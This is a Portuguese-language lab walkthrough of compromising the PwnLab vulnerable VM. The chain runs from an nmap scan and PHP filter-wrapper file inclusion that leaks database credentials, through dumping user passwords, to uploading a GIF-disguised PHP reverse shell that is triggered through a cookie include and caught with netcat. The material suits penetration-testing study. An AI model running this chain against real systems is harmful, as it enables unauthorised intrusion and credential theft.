Para encontrar as portas 80 abertas em uma rede especifica:
Executar
$ifconfig

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.189  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 2804:14c:f435:82aa:294e:300b:bcc1:574  prefixlen 64  scopeid 0x0<global>
        inet6 2804:14c:f435:82aa::1004  prefixlen 128  scopeid 0x0<global>
        inet6 fe80::92b0:fe79:f03c:1a97  prefixlen 64  scopeid 0x20<link>
        ether 5c:62:8b:9d:d0:00  txqueuelen 1000  (Ethernet)
        RX packets 674758  bytes 963402681 (918.7 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 286869  bytes 33621998 (32.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

Vai mostrar a rede que a maquina esta usando
$nmap -n -p 80 --open 192.168.0.189/24
o nmap vai mostrar todas as portas 80 vulneraveis

Nmap scan report for 192.168.0.15
Host is up (0.00015s latency).

PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:6E:D2:D6 (Oracle VirtualBox virtual NIC)
                  ^ 
Neste caso é essa |



Após acessar o bupe suite, acessar o proxy e abrir o browser
no browser vamos utilizar o ip encontrado acima para acessar a aplicação vulneravel
http://192.168.0.15/?page=php://filter/convert.base64-encode/resource=config

e vamos colocar toda essa uri phpwrapper:
php://filter/convert.base64-encode/resource=config

Vai retornar o arquivo config.php só que codificado em base 64
PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+

no Burpe tem uma aba que é um decoder, e apos a decodificação teremos o seguinte resultado:
<?php
$server	  = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>


Acessar o banco de dados mysql da aplicação:
$nmap -n -p 3306 --open 192.168.0.189/24
$mysql -h 192.168.0.15 -u root -p 
colocar a senha H4u...

no mysql:

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Users              |
+--------------------+
2 rows in set (0.001 sec)

MySQL [(none)]> use Users
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [Users]> show tables
    -> ;
+-----------------+
| Tables_in_Users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.001 sec)

MySQL [Users]> select * from users
    -> ;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+
3 rows in set (0.001 sec)


Pegar a senha do kent e no burp suite decodificar em Base64

Colocar na aplicação e vai dar certo a entrada pelo login e senha


Após acessar a funcionalidade de upload:
copiar um script: php-reverse-shell.php

cp /usr/share/webshells/php/php-reverse-shell.php .

Renomea-lo para facilitar a manipulação do mesmo:
mv php-reverse-shell.php shell.php

Pegar o ip da minha maquina e alterar no ponto especifico do arquivo:
ifconfig
no meu caso é: 192.168.0.189
nano shell.php

Mudar o arquivo para .gif porém tem um ponto importante para realizar:
mv shell.php shell.gif

file shell.gif
shell.gif: PHP script, ASCII text

nano shell.gif
Se alterarmos o magic byte inicial do arquivo para:
GIF89a<?php  

o arquivo realmente será reconhecido como gif

file shell.gif
shell.gif: GIF image data, version 89a, 16188 x 26736

Subir o arquivo para a aplicação web, vai ficar assim:
../upload/f3035846cc279a1aff73b7c2c25367b9.gif

Com a exploração de um arquivo index.php via php wrapper:
http://192.168.0.15/?page=php://filter/convert.base64-encode/resource=index

Pegamos o resultado em base64 do arquivo index.php e colamos no decoder do burp
Isso irá devolver:
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
	include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
<?php
	if (isset($_GET['page']))
	{
		include($_GET['page'].".php");
	}
	else
	{
		echo "Use this server to upload and share image files inside the intranet";
	}
?>
</center>
</body>
</html>


Ou seja, quando for include o cookie lang na pagina, é possível inserir um script na pagina


então, com o comando: netcat podemos escutar a porta colocado no script
$ nc -nlvp 1234
listening on [any] 1234 ...

Em um outro terminal, vamos ter que executar um curl passando aquele cookie:
$curl 192.168.0.15 -H "Cookie: lang=../upload/f3035846cc279a1aff73b7c2c25367b9.gif"

esse gif foi gerado no momento do upload do arquivo

No momento da execução do ultimo comando, a tela do netcat vai ter conectado no terminal do servidor que estamos invadindo...

connect to [192.168.0.189] from (UNKNOWN) [192.168.0.15] 45772
Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux
 18:47:38 up  1:39,  0 users,  load average: 0.00, 0.01, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ _






